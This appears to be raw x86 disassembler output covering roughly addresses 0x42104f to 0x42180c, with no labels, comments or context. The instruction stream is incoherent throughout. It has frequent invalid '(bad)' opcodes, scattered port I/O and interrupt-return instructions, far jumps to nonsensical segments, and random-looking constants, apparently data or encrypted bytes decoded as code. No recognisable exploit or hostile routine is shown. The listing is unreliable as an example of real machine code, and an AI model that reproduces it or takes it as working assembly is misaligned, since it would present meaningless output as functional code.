  42104f:	test   DWORD PTR [ebx+0x7196d1b4],edi
  421055:	(bad)  
  421056:	cmp    BYTE PTR [ecx+0x4bf4e01e],al
  42105c:	add    ch,BYTE PTR [eax+0x126b636d]
  421062:	sub    edi,DWORD PTR [esi+esi*1]
  421065:	in     al,0xe9
  421067:	jno    0x420fff
  421069:	fcom   DWORD PTR [esi]
  42106b:	sbb    bh,BYTE PTR [edi]
  42106d:	mov    ebp,0x9d239507
  421072:	push   0xffffffde
  421074:	and    DWORD PTR [eax-0x2e1f2523],esp
  42107a:	pop    ebx
  42107b:	lods   eax,DWORD PTR ds:[esi]
  42107c:	aaa    
  42107d:	mov    bl,0x6
  42107f:	shr    BYTE PTR [ebp+0x136442d],1
  421085:	aam    0x68
  421087:	nop
  421088:	mov    eax,ds:0xd0b0b1b
  42108d:	xor    cl,BYTE PTR [edi+ebp*4-0x4bbcdad0]
  421094:	push   ecx
  421095:	or     dl,BYTE PTR [eax-0x20]
  421098:	push   ss
  421099:	outs   dx,DWORD PTR ds:[esi]
  42109a:	cwde   
  42109b:	sar    BYTE PTR [edi],cl
  42109d:	push   ebp
  42109e:	pop    eax
  42109f:	pop    eax
  4210a0:	pop    eax
  4210a1:	ficomp DWORD PTR [eax-0x26bb85bb]
  4210a7:	cmp    ch,bh
  4210a9:	push   esp
  4210aa:	ins    DWORD PTR es:[edi],dx
  4210ab:	sbb    eax,DWORD PTR [ebx+eax*1+0x41]
  4210af:	iret   
  4210b0:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4210b2:	ret    0xe15b
  4210b5:	(bad)  
  4210b6:	inc    eax
  4210b7:	in     eax,dx
  4210b8:	js     0x421061
  4210ba:	mov    gs:0x2d3c2c1f,eax
  4210c0:	xchg   ebp,eax
  4210c1:	sbb    esi,DWORD PTR cs:[ebx]
  4210c4:	sub    BYTE PTR [esp+edi*4-0x49454cb0],dh
  4210cb:	inc    ecx
  4210cc:	mov    ebx,0xeaaa0bb1
  4210d1:	pop    esi
  4210d2:	xchg   DWORD PTR [ebx+ebp*2],ebp
  4210d5:	jg     0x421124
  4210d7:	(bad)  
  4210d8:	inc    esp
  4210d9:	cld    
  4210da:	jmp    0xd1ee:0x7fd7e663
  4210e1:	in     al,dx
  4210e2:	mov    ecx,0xc2e37cb6
  4210e7:	fisub  DWORD PTR [eax-0x5487f976]
  4210ed:	add    BYTE PTR [edi],dh
  4210ef:	mov    dh,0x20
  4210f1:	in     al,dx
  4210f2:	dec    edx
  4210f3:	aaa    
  4210f4:	fisubr DWORD PTR [ebp+0x81099fa]
  4210fa:	add    BYTE PTR ds:0xda00bf97,bh
  421100:	ins    DWORD PTR es:[edi],dx
  421101:	(bad)  [edi+0x3b0b0849]
  421107:	mov    edx,0xec2fbf8e
  42110c:	add    BYTE PTR [esi],dl
  42110e:	(bad)  
  42110f:	cmp    edx,DWORD PTR [ebx-0x67]
  421112:	jae    0x4210a2
  421114:	inc    esp
  421115:	add    bh,dl
  421117:	sub    al,0x6c
  421119:	xchg   esp,eax
  42111a:	fild   WORD PTR cs:[edi+0x20]
  42111e:	ins    BYTE PTR es:[edi],dx
  42111f:	clc    
  421120:	and    bh,BYTE PTR fs:[ecx+0x5b2ed0b4]
  421127:	dec    esp
  421128:	in     eax,dx
  421129:	inc    edi
  42112a:	cmp    cl,BYTE PTR [eax+0x307444b0]
  421130:	mov    cl,0x23
  421132:	(bad)  
  421133:	std    
  421134:	jmp    0x4210e9
  421136:	jl     0x421167
  421138:	jecxz  0x42113c
  42113a:	fist   DWORD PTR [esi-0x36]
  42113d:	jecxz  0x42113d
  42113f:	add    eax,0xfc05cf16
  421144:	fimul  WORD PTR [edx]
  421146:	(bad)  
  421147:	mov    BYTE PTR [edx+0x1c],0x1d
  42114b:	xor    edx,DWORD PTR [edi]
  42114d:	aaa    
  42114e:	sub    eax,0xd7dc0475
  421153:	es fdiv st(6),st
  421156:	cmpxchg BYTE PTR [ebx],dl
  421159:	jecxz  0x421131
  42115b:	xchg   esi,eax
  42115c:	sub    BYTE PTR cs:[edi],0x8a
  421160:	mov    WORD PTR [edi+edx*1+0x4b42b1d7],es
  421167:	ins    DWORD PTR es:[edi],dx
  421168:	sub    esi,DWORD PTR [edx+ebx*2+0xe9d9b05]
  42116f:	fldenv [edx-0x30]
  421172:	adc    eax,0xd4c1b617
  421177:	rcr    BYTE PTR [ecx],1
  421179:	and    BYTE PTR [esi-0x13],ah
  42117c:	in     al,0xd2
  42117e:	(bad)  
  42117f:	mov    dh,0x2c
  421181:	jne    0x42118a
  421183:	add    ecx,DWORD PTR [ebp+0x56]
  421186:	adc    eax,0x6d2d44c5
  42118b:	sbb    ebp,ebp
  42118d:	(bad)  
  42118e:	sbb    al,0xa1
  421190:	push   esp
  421191:	enter  0x929e,0x71
  421195:	xchg   BYTE PTR ds:0x4db6ed57,cl
  42119b:	mov    ds:0xfecc8641,al
  4211a0:	or     BYTE PTR [ebx],bl
  4211a2:	imul   esi,DWORD PTR [edi-0x44b17a26],0x4f
  4211a9:	(bad)  
  4211aa:	imul   edx,DWORD PTR [ebp-0x24],0x2d
  4211ae:	cmc    
  4211af:	mov    al,0x4d
  4211b1:	shl    BYTE PTR [esi+0x61],0x86
  4211b5:	pop    esi
  4211b6:	jmp    0x4211e8
  4211b8:	push   esi
  4211b9:	mov    edi,0x6cb13858
  4211be:	in     eax,dx
  4211bf:	push   es
  4211c0:	jno    0x42117b
  4211c2:	or     DWORD PTR [ebp+0x7d],0xd1b62035
  4211c9:	push   esp
  4211ca:	mov    ebx,0xd1ec76ba
  4211cf:	ss ins BYTE PTR es:[edi],dx
  4211d1:	push   esp
  4211d2:	pop    edx
  4211d3:	inc    edi
  4211d4:	xchg   esi,eax
  4211d5:	ss ficomp DWORD PTR ss:[ecx+esi*2-0xa930cca]
  4211de:	dec    edx
  4211df:	push   ebp
  4211e0:	stos   DWORD PTR es:[edi],eax
  4211e1:	mov    al,0x5c
  4211e3:	ficom  DWORD PTR [edi]
  4211e5:	push   0xffffffa1
  4211e7:	ret    0x50db
  4211ea:	jae    0x421235
  4211ec:	stos   BYTE PTR es:[edi],al
  4211ed:	sub    eax,0x80546db7
  4211f2:	stos   BYTE PTR es:[edi],al
  4211f3:	cmp    BYTE PTR [edi-0x72ac538f],dh
  4211f9:	lods   eax,DWORD PTR ds:[esi]
  4211fa:	pop    ebp
  4211fb:	pop    eax
  4211fc:	jne    0x4211d0
  4211fe:	pop    es
  4211ff:	rcl    BYTE PTR [ebp+0x2c],0x1a
  421203:	(bad)  
  421205:	fstp   st(2)
  421207:	test   DWORD PTR [ebp+0x709e992e],ecx
  42120d:	mov    edx,DWORD PTR [eax]
  42120f:	gs sti 
  421211:	or     DWORD PTR [edi],0xb0a9754d
  421217:	push   eax
  421218:	adc    eax,0x34d50216
  42121d:	sub    BYTE PTR [eax+0xb6c10ab],0xfd
  421224:	shr    DWORD PTR [ebp-0x4e11d93b],cl
  42122a:	mov    al,0x35
  42122c:	pop    edx
  42122d:	push   edi
  42122e:	jnp    0x42126e
  421230:	pop    ebp
  421231:	dec    ecx
  421232:	adc    al,0xc2
  421234:	jbe    0x4212a1
  421236:	dec    ebx
  421237:	jl     0x421282
  421239:	jmp    0xbd0b84f
  42123e:	sbb    bl,BYTE PTR [esi+0x44]
  421241:	fild   DWORD PTR [ebp-0x2f8a4b73]
  421247:	sub    BYTE PTR [edx+0x41],dh
  42124a:	add    al,0x50
  42124c:	jo     0x4212c1
  42124e:	xor    al,0x9a
  421250:	cli    
  421251:	xor    BYTE PTR [esi],ah
  421253:	mov    esi,0x16a5da5b
  421258:	aam    0x70
  42125a:	xchg   esp,eax
  42125b:	or     ecx,DWORD PTR [esi]
  42125d:	jb     0x42125b
  42125f:	push   cs
  421260:	(bad)  [eax]
  421262:	ins    BYTE PTR es:[edi],dx
  421263:	pop    ss
  421264:	add    al,0xa4
  421266:	ds dec edx
  421268:	pop    es
  421269:	dec    ebx
  42126a:	push   ds
  42126b:	mov    ch,0x9
  42126d:	pop    ss
  42126e:	shl    BYTE PTR [esi-0x73cafa4c],0xa9
  421275:	out    0x38,al
  421277:	jbe    0x42122a
  421279:	ins    DWORD PTR es:[edi],dx
  42127a:	lea    ebx,[ebx+0x39]
  42127d:	enter  0x1134,0x45
  421281:	mov    eax,ss
  421283:	outs   dx,BYTE PTR ds:[esi]
  421284:	ss mov dh,0x85
  421287:	push   edx
  421288:	mov    ch,0x75
  42128a:	(bad)  
  42128b:	cld    
  42128c:	jbe    0x421240
  42128e:	out    dx,eax
  42128f:	iret   
  421290:	mov    ch,0x71
  421292:	mov    eax,ds:0x94a0f8dd
  421297:	mov    bl,0x88
  421299:	jo     0x421293
  42129b:	or     al,0xe5
  42129d:	das    
  42129e:	mov    edi,0x87e24740
  4212a3:	pop    edx
  4212a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212a5:	test   BYTE PTR [eax],al
  4212a7:	mov    ds:0xfb003dfc,eax
  4212ac:	ins    DWORD PTR es:[edi],dx
  4212ad:	test   eax,0xad589451
  4212b2:	sbb    DWORD PTR [ebx],0x50
  4212b5:	pop    ds
  4212b6:	mov    edx,0x60a1d175
  4212bb:	xchg   dl,ch
  4212bd:	bound  esp,QWORD PTR [edx+0xbabbf31]
  4212c3:	lods   eax,DWORD PTR ds:[esi]
  4212c4:	fcomp  QWORD PTR [edx+0x68]
  4212c7:	mov    ecx,0xcafaac25
  4212cc:	dec    edx
  4212cd:	xchg   BYTE PTR [esi-0x28],bl
  4212d0:	adc    al,0xb7
  4212d2:	push   esp
  4212d3:	add    bh,BYTE PTR [eax+0x54]
  4212d6:	add    al,0xe8
  4212d8:	cmp    DWORD PTR [ebx+esi*1],ebx
  4212db:	add    dh,cl
  4212dd:	pop    esp
  4212de:	pusha  
  4212df:	imul   ebx,DWORD PTR [ebx-0x22],0xe0356617
  4212e6:	jne    0x4212ab
  4212e8:	push   eax
  4212e9:	or     ebx,ebx
  4212eb:	push   esi
  4212ec:	add    eax,DWORD PTR [edi]
  4212ee:	rcl    ebx,0xe5
  4212f1:	dec    ebp
  4212f2:	jge    0x421276
  4212f4:	adc    DWORD PTR [ecx+edx*8+0x248c6d2e],esi
  4212fb:	loopne 0x4212fe
  4212fd:	mov    ch,0x20
  4212ff:	xchg   ebx,eax
  421300:	add    al,0x55
  421302:	fistp  DWORD PTR [eax-0x48]
  421305:	xchg   BYTE PTR [esi+0x2a],dh
  421308:	add    al,0x28
  42130a:	cmp    DWORD PTR [ebx-0x41],ebp
  42130d:	lea    eax,[ebp-0x103a368a]
  421313:	loop   0x42132a
  421315:	inc    ecx
  421316:	rol    DWORD PTR [edi-0x31],0x30
  42131a:	cwde   
  42131b:	fcmovbe st,st(6)
  42131d:	cmc    
  42131e:	ja     0x4212ae
  421320:	sub    esp,DWORD PTR [ebx]
  421322:	mov    al,0x79
  421324:	jmp    0xe967c9ff
  421329:	inc    esp
  42132a:	gs cwde 
  42132c:	or     ebp,DWORD PTR [edx-0x3d585903]
  421332:	mov    dh,0x6d
  421334:	ins    DWORD PTR es:[edi],dx
  421335:	mov    BYTE PTR [eax],cl
  421337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421338:	xchg   ebp,eax
  421339:	sub    DWORD PTR [edx-0x4d],ebp
  42133c:	sbb    cl,al
  42133e:	pop    ebp
  42133f:	call   0x970e00e6
  421344:	push   esi
  421345:	jge    0x42133f
  421347:	pop    ebp
  421348:	sar    esp,cl
  42134a:	aad    0x6d
  42134c:	push   ebx
  42134d:	jne    0x4212f2
  42134f:	mov    eax,ds:0x30cfc766
  421354:	daa    
  421355:	mov    esi,0x6de02bf5
  42135a:	push   esp
  42135b:	addr16 mov cl,0xef
  42135e:	iret   
  42135f:	add    BYTE PTR [ebp+0x43df768d],0x89
  421366:	nop
  421367:	pop    esi
  421368:	add    DWORD PTR [ecx],ecx
  42136a:	fsubr  DWORD PTR [eax+0x5]
  42136d:	adc    al,0xbf
  42136f:	int3   
  421370:	aas    
  421371:	dec    edx
  421372:	lods   eax,DWORD PTR ds:[esi]
  421373:	test   DWORD PTR [edx+0x26c26a5d],esi
  421379:	lds    ebx,FWORD PTR [eax+0x51dc4449]
  42137f:	pop    ss
  421380:	fidiv  DWORD PTR ss:[ebx-0x2]
  421384:	mov    dh,0xdb
  421386:	jnp    0x4213d7
  421388:	jmp    0x42134f
  42138a:	ins    DWORD PTR es:[edi],dx
  42138b:	ins    DWORD PTR es:[edi],dx
  42138c:	pop    ebx
  42138d:	ficomp DWORD PTR [eax+eiz*2+0x32978ff9]
  421394:	fcomp  DWORD PTR [eax+0x12b6408c]
  42139a:	sub    al,0xb4
  42139c:	sbb    bl,BYTE PTR [esi-0x26]
  42139f:	fs (bad) 
  4213a1:	clc    
  4213a2:	sbb    al,0xa1
  4213a4:	push   ecx
  4213a5:	sub    eax,0xefd66edc
  4213aa:	or     dl,bl
  4213ac:	add    al,0xe8
  4213ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213af:	lea    ebp,[ebp-0x68ff4284]
  4213b5:	or     BYTE PTR [edi-0x3f],bl
  4213b8:	fcom   st(1)
  4213ba:	shl    DWORD PTR [esi-0x4549248a],1
  4213c0:	pop    esp
  4213c1:	fadd   DWORD PTR [edx]
  4213c3:	cmp    ch,BYTE PTR [eax-0x34]
  4213c6:	rcl    bh,0xbf
  4213c9:	lock ss aam 0x76
  4213cd:	(bad)  
  4213cf:	jecxz  0x4213ee
  4213d1:	(bad)  
  4213d2:	or     DWORD PTR [edi],ebp
  4213d4:	push   ds
  4213d5:	(bad)  
  4213d6:	retf   0x9694
  4213d9:	fisubr DWORD PTR [ebp+0x35735da3]
  4213df:	outs   dx,DWORD PTR ds:[esi]
  4213e0:	mov    DWORD PTR [eax-0x4fbbb44d],ebx
  4213e6:	fstp   st(0)
  4213e8:	sub    DWORD PTR [edx+0xf],ecx
  4213eb:	and    al,BYTE PTR [eax-0x48975fce]
  4213f1:	inc    esi
  4213f2:	ror    BYTE PTR [esi+eiz*2],1
  4213f5:	out    dx,al
  4213f6:	push   esi
  4213f7:	addr16 pminub mm3,mm3
  4213fb:	lods   eax,DWORD PTR ds:[esi]
  4213fc:	pop    ebp
  4213fd:	pop    edx
  4213fe:	jl     0x421457
  421400:	xchg   edx,eax
  421401:	imul   esi,edi,0xae6d7126
  421407:	(bad)
  42140a:	pusha  
  42140b:	fistp  DWORD PTR [edx]
  42140d:	nop
  42140e:	mov    eax,ds:0x5c23862
  421413:	dec    ebp
  421414:	add    ebp,DWORD PTR [ebp-0x35952253]
  42141a:	adc    BYTE PTR [esi*8+0x6decdd1a],dh
  421421:	push   0xffffffb7
  421423:	mov    dl,0xc5
  421425:	arpl   WORD PTR [ecx+0x245c9c33],bx
  42142b:	lods   al,BYTE PTR ds:[esi]
  42142c:	xor    dl,bh
  42142e:	jbe    0x421491
  421430:	pop    ebx
  421431:	(bad)  
  421432:	xor    ch,bh
  421434:	adc    DWORD PTR [ebp+0x3e],edx
  421437:	mov    dl,0xf2
  421439:	retf   0xe091
  42143c:	(bad)  
  42143d:	(bad)  
  42143e:	ret    0x1c60
  421441:	mov    ebx,0xd4e48e1c
  421446:	loop   0x4213df
  421448:	or     bl,bl
  42144a:	push   cs
  42144b:	cmp    BYTE PTR [eax+0x63],bh
  42144e:	xlat   BYTE PTR ds:[ebx]
  42144f:	jle    0x4214af
  421451:	inc    BYTE PTR [ebx]
  421453:	xchg   ebx,eax
  421454:	or     ebp,DWORD PTR [ebp-0x658e9525]
  42145a:	mov    dl,0x35
  42145c:	adc    ebx,DWORD PTR [ebx-0x5272f03f]
  421462:	add    al,0xb5
  421464:	mov    BYTE PTR [ecx+0x0],al
  421467:	sub    ebp,ebx
  421469:	mov    ebp,0xa5c2b76a
  42146e:	lahf   
  42146f:	sbb    cl,BYTE PTR [ebx]
  421471:	xor    bl,BYTE PTR [edx-0x4655f0b]
  421477:	je     0x42141a
  421479:	mov    al,0x5d
  42147b:	and    eax,DWORD PTR [esi]
  42147d:	jmp    FWORD PTR [edx+ebx*8]
  421480:	pop    ebx
  421481:	shr    DWORD PTR [ebx],cl
  421483:	out    0xed,eax
  421485:	imul   edx,DWORD PTR [edi-0x4c],0x4e4340f5
  42148c:	push   eax
  42148d:	cmp    BYTE PTR [ebp+0x1a],al
  421490:	(bad)  [esi+0xe47b76d]
  421496:	jo     0x421488
  421498:	sahf   
  421499:	cmp    BYTE PTR [eax-0x164ce89c],dh
  42149f:	fcomp  QWORD PTR [ebx-0x55]
  4214a2:	pop    edx
  4214a3:	push   0xffffff9b
  4214a5:	add    bl,dh
  4214a7:	jge    0x421508
  4214a9:	test   DWORD PTR [esi-0x79912eae],esi
  4214af:	cmp    esp,DWORD PTR [ecx-0x2d76da65]
  4214b5:	(bad)  
  4214b6:	xchg   esi,eax
  4214b7:	outs   dx,BYTE PTR ds:[esi]
  4214b8:	es scas eax,DWORD PTR es:[edi]
  4214ba:	and    al,al
  4214bc:	jp     0x421464
  4214be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214bf:	or     edx,DWORD PTR [ecx]
  4214c1:	loope  0x421485
  4214c3:	(bad)  
  4214c4:	mov    cl,0xcf
  4214c7:	iret   
  4214c8:	shr    DWORD PTR [esi],cl
  4214ca:	out    dx,al
  4214cb:	adc    eax,DWORD PTR [esi+0x6d8206b8]
  4214d1:	imul   edi,DWORD PTR [ecx-0x13a61329],0xed6c2d7d
  4214db:	rol    DWORD PTR [esi+0x1784a401],cl
  4214e1:	gs and ecx,ecx
  4214e4:	jo     0x421559
  4214e6:	push   ecx
  4214e7:	pop    esp
  4214e8:	fmul   st,st(0)
  4214ea:	es push ebp
  4214ec:	icebp  
  4214ed:	mov    edi,ebp
  4214ef:	or     dh,BYTE PTR [ebp+0x7dd6d2ed]
  4214f5:	retf   0xa25f
  4214f8:	inc    edi
  4214f9:	sbb    DWORD PTR [ecx+eiz*4+0x4da068c5],eax
  421500:	aam    0x16
  421502:	xor    eax,0x42de4060
  421507:	jne    0x421574
  421509:	imul   ebx,DWORD PTR [ebx+0x117f992d],0x50
  421510:	lods   al,BYTE PTR ds:[esi]
  421511:	sbb    al,0xce
  421513:	cli    
  421514:	fidiv  DWORD PTR [esi+0x59eea96d]
  42151a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42151b:	lods   eax,DWORD PTR ds:[esi]
  42151c:	pop    edi
  42151d:	fwait
  42151e:	pop    eax
  42151f:	das    
  421520:	mov    edx,0xa96d5779
  421525:	sub    DWORD PTR [edx+0x243ebc],0xddaa8ea
  42152f:	rol    DWORD PTR [edx-0x5a],cl
  421532:	repz aam 0xa2
  421535:	sub    ecx,edi
  421537:	jmp    0x16582c16
  42153c:	adc    BYTE PTR [eax-0x33],ah
  42153f:	outs   dx,DWORD PTR ds:[esi]
  421540:	dec    edi
  421541:	dec    ecx
  421542:	sbb    bh,BYTE PTR [ecx]
  421544:	shr    BYTE PTR [ebp-0x5d],1
  421547:	pop    ebp
  421548:	jno    0x421592
  42154a:	and    BYTE PTR [edx],al
  42154c:	and    DWORD PTR [edx-0x59],esi
  42154f:	cld    
  421550:	ins    BYTE PTR es:[edi],dx
  421551:	xchg   al,bl
  421553:	outs   dx,BYTE PTR ds:[esi]
  421554:	or     eax,0xebdd8e95
  421559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42155a:	aam    0x9f
  42155c:	mov    ds:0x82582e0a,al
  421561:	or     ecx,eax
  421563:	xchg   BYTE PTR [eax-0x449291f2],bh
  421569:	adc    eax,0x89226252
  42156e:	sbb    DWORD PTR [ecx-0x3ff24950],0x5b
  421575:	imul   ebx,ebx,0xffffffda
  421578:	sbb    al,cl
  42157a:	popf   
  42157b:	mov    edx,0x771c9ec8
  421580:	cmp    al,0x56
  421582:	or     cl,BYTE PTR [edx+0x4]
  421585:	sub    eax,0xe16126b4
  42158a:	imul   esp,ebx,0x7
  42158d:	rcr    BYTE PTR [edx-0x72],1
  421590:	mov    ebx,0xd77d318
  421595:	mov    dh,0xdd
  421597:	fisubr DWORD PTR [ebp+0x7c]
  42159a:	je     0x4215e4
  42159c:	lods   al,BYTE PTR ds:[esi]
  42159d:	mov    edi,0x325cef71
  4215a2:	cwde   
  4215a3:	ret    0x1ada
  4215a6:	test   DWORD PTR [ecx-0x1031432a],ecx
  4215ac:	mov    ch,0x5d
  4215ae:	fcomp  DWORD PTR [eax-0x47]
  4215b1:	mov    bl,0xe1
  4215b3:	fadd   st,st(7)
  4215b5:	xor    BYTE PTR [edi-0xb],0x22
  4215b9:	lea    ecx,[ebp-0x2b]
  4215bc:	pop    ss
  4215bd:	int3   
  4215be:	add    cl,BYTE PTR [edx-0x7a0c835a]
  4215c4:	push   es
  4215c5:	sbb    BYTE PTR [ebx],0xf
  4215c8:	scas   eax,DWORD PTR es:[edi]
  4215c9:	jb     0x42161e
  4215cb:	jmp    0x421594
  4215cd:	movzx  esi,WORD PTR [esi-0x79cba87b]
  4215d4:	and    edi,edx
  4215d6:	sub    esi,edi
  4215d8:	push   esp
  4215d9:	inc    ebx
  4215da:	xor    BYTE PTR [ecx+eax*8],0xed
  4215de:	mov    eax,ds:0xaac2325f
  4215e3:	sahf   
  4215e4:	pop    ebp
  4215e5:	sbb    eax,0x82e7422c
  4215ea:	cs jl  0x4215ea
  4215ed:	ins    BYTE PTR es:[edi],dx
  4215ee:	repnz xor eax,0xba37976e
  4215f4:	stos   BYTE PTR es:[edi],al
  4215f5:	in     eax,dx
  4215f6:	or     al,0xa5
  4215f8:	adc    al,0x95
  4215fa:	push   esi
  4215fb:	add    DWORD PTR [edi+0x5d6c5ee3],eax
  421601:	adc    BYTE PTR [ebx],bl
  421603:	mov    ah,0x60
  421605:	repz xor al,0x5f
  421608:	repnz ins BYTE PTR es:[edi],dx
  42160a:	pop    ebx
  42160b:	mov    ebx,0xd4e27e6d
  421610:	jb     0x421596
  421612:	lods   eax,DWORD PTR ds:[esi]
  421613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421614:	das    
  421615:	retf   
  421616:	or     al,BYTE PTR [ecx]
  421618:	or     eax,0x70ee2b55
  42161d:	out    dx,eax
  42161e:	ficomp DWORD PTR [ebp+0x10]
  421621:	pop    ebx
  421622:	or     ecx,esp
  421624:	loopne 0x421696
  421626:	es lahf 
  421628:	mov    edi,0xa83b05d6
  42162d:	and    eax,0x82a87a3b
  421632:	xchg   edx,eax
  421633:	push   ds
  421634:	pop    ebx
  421635:	fld    TBYTE PTR [esi-0x13]
  421638:	mov    eax,0xacf8771a
  42163d:	sbb    eax,0xd1ce293b
  421642:	imul   edx,DWORD PTR [eax+esi*4],0xfffffffd
  421646:	outs   dx,BYTE PTR ds:[esi]
  421647:	or     esi,DWORD PTR [ebx+ebx*8-0x23]
  42164b:	pop    esi
  42164c:	enter  0xe58c,0xb7
  421650:	mov    dh,0xfd
  421652:	fiadd  DWORD PTR [edx-0x75838335]
  421658:	push   ds
  421659:	add    bl,BYTE PTR [edi]
  42165b:	mov    edi,0xdd45d626
  421660:	sub    BYTE PTR [edi+0x6d],dl
  421663:	outs   dx,BYTE PTR ds:[esi]
  421664:	and    al,0xe2
  421666:	stc    
  421667:	loopne 0x4216a2
  421669:	pop    ebx
  42166a:	or     eax,0x5c53a975
  42166f:	pushf  
  421670:	jmp    0x421642
  421672:	mov    bl,0x4
  421674:	pop    edx
  421675:	pop    ebx
  421676:	pop    ebx
  421677:	dec    ebx
  421678:	pop    ebx
  421679:	jg     0x421638
  42167b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42167c:	mov    WORD PTR [edx-0x1b],gs
  42167f:	jns    0x421612
  421681:	or     eax,0xa81bbeb6
  421686:	sti    
  421687:	je     0x421654
  421689:	clc    
  42168a:	adc    esi,ebx
  42168c:	xor    eax,0xb6174a37
  421691:	mov    ecx,0x53c4986b
  421696:	dec    edi
  421697:	es leave 
  421699:	cs jbe 0x421709
  42169c:	imul   ebx,ebx,0x8ad94a45
  4216a2:	dec    edx
  4216a3:	popa   
  4216a4:	cwde   
  4216a5:	in     al,dx
  4216a6:	inc    edi
  4216a7:	fld    TBYTE PTR [ebp+0x2b]
  4216aa:	inc    eax
  4216ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216ac:	into   
  4216ad:	jnp    0x4216c6
  4216af:	std    
  4216b0:	mov    bh,0x77
  4216b2:	xchg   DWORD PTR [esi],esi
  4216b4:	ss dec edx
  4216b6:	or     eax,edi
  4216b8:	in     al,0x2
  4216ba:	lahf   
  4216bb:	and    eax,0x1b6c4400
  4216c0:	inc    ebp
  4216c1:	fild   DWORD PTR [esi-0x49033da3]
  4216c7:	cmc    
  4216c8:	mov    al,0x9
  4216ca:	fadd   DWORD PTR [eax-0x69b765fd]
  4216d0:	or     ch,BYTE PTR [ebp+0x1942e281]
  4216d6:	inc    edi
  4216d7:	dec    esp
  4216d8:	test   eax,0xf8585ffc
  4216dd:	lds    ebp,FWORD PTR [ebp-0x67868901]
  4216e3:	xchg   DWORD PTR [edi],eax
  4216e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216e6:	xchg   edi,eax
  4216e7:	mov    ds:0xd85b41ba,eax
  4216ec:	test   BYTE PTR [ebp-0x52f74e4e],al
  4216f2:	inc    edx
  4216f3:	xor    BYTE PTR [ebp+0x61],ch
  4216f6:	imul   ebx,DWORD PTR [edi],0xffffffa7
  4216f9:	out    dx,al
  4216fa:	mul    DWORD PTR [eax]
  4216fc:	inc    ecx
  4216fd:	add    eax,0xedda08df
  421702:	test   cl,0xa5
  421705:	inc    esp
  421706:	lds    edi,FWORD PTR [eax-0x50]
  421709:	pop    ss
  42170a:	xchg   esi,eax
  42170b:	cmp    ch,ch
  42170d:	pusha  
  42170e:	sbb    ch,BYTE PTR [esi]
  421710:	mov    cl,0x2d
  421712:	ins    DWORD PTR es:[edi],dx
  421713:	mov    esp,cs
  421715:	out    0xf9,al
  421717:	pop    ss
  421718:	shl    DWORD PTR [esi-0x25],1
  42171b:	pop    es
  42171c:	mov    edx,0xae36d4b5
  421721:	inc    eax
  421722:	out    0x7d,al
  421724:	mov    eax,0x1a824325
  421729:	lea    eax,[edx-0x25]
  42172c:	mov    ds:0xbb464d89,eax
  421731:	aas    
  421732:	push   edx
  421733:	mov    ds:0x1b6bdb62,eax
  421738:	cwde   
  421739:	xchg   esi,eax
  42173a:	jecxz  0x4216e3
  42173c:	mov    dh,0xb5
  42173e:	in     eax,dx
  42173f:	ret    0x7333
  421742:	adc    ah,dh
  421744:	xor    dh,BYTE PTR [ecx-0x5c]
  421747:	retf   
  421748:	(bad)  
  421749:	bound  esi,QWORD PTR [esi+0x15dbb45b]
  42174f:	sub    DWORD PTR [ecx],ecx
  421751:	fwait
  421752:	add    bl,BYTE PTR [eax+edi*1-0x1f071c86]
  421759:	inc    edx
  42175a:	mov    ebx,0x6ec79bd0
  42175f:	aad    0xad
  421761:	cmp    eax,0x1a360c56
  421766:	pop    ss
  421767:	call   0x4bf4:0x6daf79f5
  42176e:	push   esp
  42176f:	xor    al,0x61
  421771:	mov    ebx,edx
  421773:	xchg   esi,eax
  421774:	mov    DWORD PTR [ebp-0x6b],edi
  421777:	jbe    0x42175a
  421779:	xor    al,0x70
  42177b:	mov    dh,0x12
  42177d:	mov    ah,0x41
  42177f:	clc    
  421780:	jne    0x4217a3
  421782:	sbb    eax,0x6976850a
  421787:	fld    TBYTE PTR [edx+0x57841c6]
  42178d:	adc    al,0x6e
  42178f:	mov    ecx,0x5d850b1f
  421794:	shl    BYTE PTR [edx+0x12],0x69
  421798:	mov    al,0x70
  42179a:	add    DWORD PTR [ebp-0x75],ebp
  42179d:	ins    DWORD PTR es:[edi],dx
  42179e:	dec    ebx
  42179f:	or     ecx,DWORD PTR [ebx-0x5f]
  4217a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217a3:	push   ebp
  4217a4:	xchg   esp,eax
  4217a5:	sbb    eax,0x1192ef95
  4217aa:	or     eax,ebp
  4217ac:	mov    dh,0x5
  4217ae:	fs push cs
  4217b0:	cmp    BYTE PTR [ebp-0x492f92fc],0xd
  4217b7:	mov    al,0x6b
  4217b9:	cli    
  4217ba:	dec    edx
  4217bb:	mov    bl,0x62
  4217bd:	(bad)  
  4217be:	out    0xbb,al
  4217c0:	mov    cl,0x6d
  4217c2:	ins    BYTE PTR es:[edi],dx
  4217c3:	cli    
  4217c4:	lods   al,BYTE PTR ds:[esi]
  4217c5:	dec    esi
  4217c6:	jo     0x421806
  4217c8:	inc    ecx
  4217c9:	sbb    BYTE PTR [eax+0x56],bl
  4217cc:	jp     0x421768
  4217ce:	sbb    bl,0x42
  4217d1:	jbe    0x4217d6
  4217d3:	xchg   BYTE PTR [ecx],bl
  4217d5:	push   0xfffffff6
  4217d7:	pop    eax
  4217d8:	adc    dh,0x76
  4217db:	fild   DWORD PTR [edi+0x4e]
  4217de:	gs push 0xffffffac
  4217e1:	mov    eax,ds:0x16160448
  4217e6:	or     al,0xb5
  4217e8:	(bad)  
  4217e9:	out    dx,eax
  4217ea:	jl     0x4217d6
  4217ec:	call   0xdddb:0x63703ad8
  4217f3:	(bad)  
  4217f4:	out    0xca,al
  4217f6:	xchg   esi,eax
  4217f7:	leave  
  4217f8:	mov    ebp,0x10742e42
  4217fd:	sbb    ecx,DWORD PTR [edx-0x74]
  421800:	push   cs
  421801:	push   es
  421802:	xchg   BYTE PTR ds:0x6dc4e0a2,bh
  421808:	jmp    0x42180a
  42180a:	push   ebx
  42180b:	(bad)  
  42180c:	mov    ecx,0xf15db366
